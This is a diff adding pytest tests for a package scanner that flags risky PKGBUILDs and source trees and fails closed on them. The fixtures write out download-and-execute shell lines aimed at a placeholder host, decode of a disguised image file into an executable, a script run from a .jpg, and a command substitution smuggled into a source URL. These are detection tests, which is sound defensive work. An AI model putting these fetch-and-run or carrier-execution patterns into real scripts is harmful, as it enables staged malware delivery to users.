@@ -93,6 +93,44 @@ def test_deep_static_does_not_execute_package_functions(tmp_path: Path):
     assert any(f.rule_id == "DEEPSTATIC-SETUPPY-SUSPICIOUS" for f in result.findings)
 
 
+def test_dynamic_declared_source_fails_closed_without_shell_evaluation(tmp_path: Path):
+    pkgbuild = tmp_path / "PKGBUILD"
+    pkgbuild.write_text(
+        'pkgname=demo\nsource=("https://example.invalid/$(printf fixture).tar")\n',
+        encoding="utf-8",
+    )
+
+    result = DeepStaticAnalyzer(clamav=FakeClamAV()).analyze_pkgbuild(
+        str(pkgbuild),
+        pkgbuild.read_text(encoding="utf-8"),
+    )
+
+    finding = next(f for f in result.findings if f.rule_id == "SOURCE-PARSER-AMBIGUOUS")
+    assert result.is_safe is False
+    assert finding.severity == Severity.HIGH
+    assert finding.blocks_installation is True
+    assert "printf fixture" not in finding.evidence_snippet
+
+
+def test_unsupported_declared_source_fails_closed(tmp_path: Path):
+    pkgbuild = tmp_path / "PKGBUILD"
+    pkgbuild.write_text(
+        'pkgname=demo\nsource=("git://example.invalid/repo.git")\nsha256sums=(SKIP)\n',
+        encoding="utf-8",
+    )
+
+    result = DeepStaticAnalyzer(clamav=FakeClamAV()).analyze_pkgbuild(
+        str(pkgbuild),
+        pkgbuild.read_text(encoding="utf-8"),
+    )
+
+    assert result.is_safe is False
+    assert any(
+        f.rule_id == "SOURCE-UNSUPPORTED" and f.blocks_installation
+        for f in result.findings
+    )
+
+
 def test_source_archive_clamav_phase_is_reported(tmp_path: Path):
     archive = tmp_path / "src.tar"
     write_tar(archive, [("file.txt", "hello", 0o644)])
@@ -148,6 +186,27 @@ def test_suspicious_package_json_script_scanned_as_text_only(tmp_path: Path):
     assert any(f.rule_id == "DEEPSTATIC-NPM-INSTALL-SCRIPT" for f in findings)
 
 
+def test_hostile_package_json_shapes_fail_closed_without_crashing(tmp_path: Path):
+    for index, payload in enumerate((
+        "[]",
+        '{"scripts":"postinstall"}',
+        '{"scripts":{"postinstall":[]}}',
+        '{"dependencies":[],"devDependencies":{}}',
+    )):
+        source = tmp_path / f"source-{index}"
+        source.mkdir()
+        (source / "package.json").write_text(payload)
+
+        findings = DeepStaticAnalyzer(clamav=FakeClamAV()).inspect_source_tree(source)
+
+        incomplete = next(
+            finding
+            for finding in findings
+            if finding.rule_id == "DEEPSTATIC-INSPECTION-INCOMPLETE-001"
+        )
+        assert incomplete.blocks_installation is True
+
+
 def test_credential_reference_in_source_tree_creates_finding(tmp_path: Path):
     source = tmp_path / "source"
     source.mkdir()
@@ -166,6 +225,136 @@ def test_network_fetch_in_makefile_creates_finding(tmp_path: Path):
     findings = DeepStaticAnalyzer(clamav=FakeClamAV()).inspect_source_tree(source)
 
     assert any(f.rule_id == "DEEPSTATIC-NETWORK-FETCH" for f in findings)
+
+
+def test_vendored_executable_text_is_still_bounded_and_analyzed(tmp_path: Path):
+    source = tmp_path / "source"
+    script = source / "vendor" / "fixture" / "loader.sh"
+    script.parent.mkdir(parents=True)
+    script.write_text(
+        "curl https://example.invalid/fixture -o fixture-stage\n"
+        "sh fixture-stage\n",
+        encoding="utf-8",
+    )
+
+    findings = DeepStaticAnalyzer(clamav=FakeClamAV()).inspect_source_tree(source)
+
+    assert any(f.rule_id == "DEEPSTATIC-VENDORED-DEPS" for f in findings)
+    staged = next(
+        f for f in findings if f.rule_id == "DEEPSTATIC-REMOTE-STAGE-EXEC-001"
+    )
+    assert staged.severity == Severity.CRITICAL
+    assert staged.blocks_installation is True
+
+
+def test_remote_stage_execution_in_acquired_source_is_blocked(tmp_path: Path):
+    source = tmp_path / "source"
+    source.mkdir()
+    (source / "bootstrap.sh").write_text(
+        "curl https://example.invalid/fixture -o fixture.carrier\n"
+        "xxd -r fixture.carrier fixture-stage\n"
+        "./fixture-stage\n"
+    )
+
+    findings = DeepStaticAnalyzer(clamav=FakeClamAV()).inspect_source_tree(source)
+
+    staged = next(f for f in findings if f.rule_id == "DEEPSTATIC-REMOTE-STAGE-EXEC-001")
+    assert staged.severity == Severity.CRITICAL
+    assert staged.blocks_installation is True
+    assert staged.line_number == 1
+    assert "example.invalid" not in staged.evidence_snippet
+    assert "fixture-stage" not in staged.evidence_snippet
+    assert not any(
+        f.rule_id == "DEEPSTATIC-OPAQUE-CARRIER-EXEC-001" for f in findings
+    )
+
+
+def test_remote_stage_documentation_or_unexecuted_download_is_not_blocked(tmp_path: Path):
+    source = tmp_path / "source"
+    source.mkdir()
+    (source / "bootstrap.sh").write_text(
+        "# curl https://example.invalid/fixture -o fixture-stage; sh fixture-stage\n"
+        "printf '%s\\n' 'curl https://example.invalid/fixture -o fixture-stage; sh fixture-stage'\n"
+        "curl https://example.invalid/archive -o source.tar\n"
+        "install -Dm644 source.tar \"$DESTDIR/usr/share/fixture/source.tar\"\n"
+    )
+
+    findings = DeepStaticAnalyzer(clamav=FakeClamAV()).inspect_source_tree(source)
+
+    assert not any(f.rule_id == "DEEPSTATIC-REMOTE-STAGE-EXEC-001" for f in findings)
+
+
+def test_remote_stage_command_bound_fails_deep_static_closed(tmp_path: Path):
+    source = tmp_path / "source"
+    source.mkdir()
+    (source / "bootstrap.sh").write_text("true;" * 16385)
+
+    findings = DeepStaticAnalyzer(clamav=FakeClamAV()).inspect_source_tree(source)
+
+    incomplete = next(
+        finding
+        for finding in findings
+        if finding.rule_id == "DEEPSTATIC-INSPECTION-INCOMPLETE-001"
+    )
+    assert incomplete.blocks_installation is True
+
+
+def test_local_carrier_decode_then_execution_in_source_is_blocked(tmp_path: Path):
+    source = tmp_path / "source"
+    source.mkdir()
+    (source / "bootstrap.sh").write_text(
+        "xxd -r resources/banner.png generated-stage\n"
+        "./generated-stage\n"
+    )
+
+    findings = DeepStaticAnalyzer(clamav=FakeClamAV()).inspect_source_tree(source)
+
+    carrier = next(
+        item
+        for item in findings
+        if item.rule_id == "DEEPSTATIC-OPAQUE-CARRIER-EXEC-001"
+    )
+    assert carrier.severity == Severity.CRITICAL
+    assert carrier.blocks_installation is True
+    assert carrier.line_number == 1
+    assert "banner" not in carrier.evidence_snippet
+    assert "generated-stage" not in carrier.evidence_snippet
+
+
+def test_media_named_interpreter_input_in_source_is_blocked(tmp_path: Path):
+    source = tmp_path / "source"
+    source.mkdir()
+    (source / "bootstrap.sh").write_text("python3 resources/preview.jpg\n")
+
+    findings = DeepStaticAnalyzer(clamav=FakeClamAV()).inspect_source_tree(source)
+
+    carrier = next(
+        item
+        for item in findings
+        if item.rule_id == "DEEPSTATIC-OPAQUE-CARRIER-EXEC-001"
+    )
+    assert carrier.severity == Severity.CRITICAL
+    assert carrier.blocks_installation is True
+
+
+def test_inert_carriers_and_normal_scripts_in_source_are_not_blocked(tmp_path: Path):
+    source = tmp_path / "source"
+    source.mkdir()
+    (source / "bootstrap.sh").write_text(
+        "# bash resources/preview.jpg\n"
+        "printf '%s\\n' 'python3 resources/preview.jpg'\n"
+        "base64 -d resources/preview.jpg > generated-stage\n"
+        "install -Dm644 generated-stage \"$DESTDIR/usr/share/demo/generated-stage\"\n"
+        "convert resources/preview.jpg resources/thumbnail.webp\n"
+        "python3 scripts/build.py\n"
+    )
+
+    findings = DeepStaticAnalyzer(clamav=FakeClamAV()).inspect_source_tree(source)
+
+    assert not any(
+        item.rule_id == "DEEPSTATIC-OPAQUE-CARRIER-EXEC-001"
+        for item in findings
+    )
 
 
 def test_eval_chain_in_source_tree_creates_finding(tmp_path: Path):
@@ -306,6 +495,68 @@ def test_deep_static_does_not_follow_extensionless_source_symlink(tmp_path: Path
     findings = DeepStaticAnalyzer(clamav=FakeClamAV()).inspect_source_tree(source)
 
     assert not any(f.rule_id == "DEEPSTATIC-REMOTE-ADMIN-BACKDOOR-001" for f in findings)
+    incomplete = next(
+        finding
+        for finding in findings
+        if finding.rule_id == "DEEPSTATIC-INSPECTION-INCOMPLETE-001"
+    )
+    assert incomplete.blocks_installation is True
+
+
+def test_deep_static_fails_closed_when_tree_entry_bound_is_exceeded(tmp_path: Path):
+    source = tmp_path / "source"
+    source.mkdir()
+    for index in range(4):
+        (source / f"script-{index}.sh").write_text("printf 'bounded fixture\\n'\n")
+
+    findings = DeepStaticAnalyzer(
+        clamav=FakeClamAV(),
+        max_tree_entries=3,
+    ).inspect_source_tree(source)
+
+    incomplete = next(
+        finding
+        for finding in findings
+        if finding.rule_id == "DEEPSTATIC-INSPECTION-INCOMPLETE-001"
+    )
+    assert incomplete.severity == Severity.HIGH
+    assert incomplete.blocks_installation is True
+    assert "script-" not in incomplete.evidence_snippet
+
+
+def test_deep_static_fails_closed_when_candidate_exceeds_file_bound(tmp_path: Path):
+    source = tmp_path / "source"
+    source.mkdir()
+    (source / "script.sh").write_bytes(b"x" * 33)
+
+    findings = DeepStaticAnalyzer(
+        clamav=FakeClamAV(),
+        max_file_size=32,
+    ).inspect_source_tree(source)
+
+    assert any(
+        finding.rule_id == "DEEPSTATIC-INSPECTION-INCOMPLETE-001"
+        and finding.blocks_installation
+        for finding in findings
+    )
+
+
+def test_deep_static_fails_closed_on_uninspected_nested_archive(tmp_path: Path):
+    source = tmp_path / "source"
+    source.mkdir()
+    nested = source / "payload.zip"
+    nested.write_bytes(b"inert nested archive fixture")
+
+    findings = DeepStaticAnalyzer(clamav=FakeClamAV()).inspect_source_tree(source)
+
+    finding = next(
+        item
+        for item in findings
+        if item.rule_id == "DEEPSTATIC-NESTED-ARCHIVE-UNINSPECTED-001"
+    )
+    assert finding.severity == Severity.HIGH
+    assert finding.blocks_installation is True
+    assert "payload.zip" not in finding.evidence_snippet
 
 
 def test_deep_static_tailscale_ssh_without_auth_key_is_not_backdoor_match(tmp_path: Path):
